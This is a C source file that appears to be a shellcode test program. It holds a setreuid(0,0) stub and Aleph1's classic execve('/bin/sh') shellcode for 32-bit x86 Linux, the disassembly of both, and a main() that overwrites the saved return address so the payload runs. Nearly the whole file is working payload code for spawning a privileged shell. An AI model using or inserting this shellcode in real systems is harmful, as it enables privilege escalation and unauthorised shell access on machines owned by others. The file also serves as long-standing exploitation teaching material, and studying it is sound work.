// setreuid.o:     file format elf32-i386
// 
// 
// Disassembly of section .text:
// 
// 00000000 <_start>:
//    0:	31 c0                	xor    %eax,%eax
//    2:	b0 46                	mov    $0x46,%al
//    4:	31 db                	xor    %ebx,%ebx
//    6:	31 c9                	xor    %ecx,%ecx
//    8:	cd 80                	int    $0x80
/*
shellcodeasm2.c
------------------------------------------------------------------------------
void main() {
__asm__("
        jmp    0x1f                     # 2 bytes
        popl   %esi                     # 1 byte
        movl   %esi,0x8(%esi)           # 3 bytes
        xorl   %eax,%eax                # 2 bytes
	movb   %eax,0x7(%esi)		# 3 bytes
        movl   %eax,0xc(%esi)           # 3 bytes
        movb   $0xb,%al                 # 2 bytes
        movl   %esi,%ebx                # 2 bytes
        leal   0x8(%esi),%ecx           # 3 bytes
        leal   0xc(%esi),%edx           # 3 bytes
        int    $0x80                    # 2 bytes
        xorl   %ebx,%ebx                # 2 bytes
        movl   %ebx,%eax                # 2 bytes
        inc    %eax                     # 1 bytes
        int    $0x80                    # 2 bytes
        call   -0x24                    # 5 bytes
        .string \"/bin/sh\"             # 8 bytes
					# 46 bytes total
");*/

char shellcode[] =
        // setuid(0).  I added a xor ebx,ebx and xor ecx,ecx.
        // while not strictly necessary, it prevents seg faults, if subsequent
        // opcodes assume that these regs were cleared.
        "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80"
        
        // Aleph1's famous shellcode.  Assembly instructions above.
	"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
	"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
	"\x80\xe8\xdc\xff\xff\xff/bin/sh";
        
int main() {                    // main function
    int * ret;                  // ret pointer for manipulating saved return
    ret = (int *)&ret + 2;      // set ret to point to saved return
                                // value on the stack
    (*ret) = (int)shellcode;    // change the saved return value to the
                                // address of the shellcode, so it executes.
}
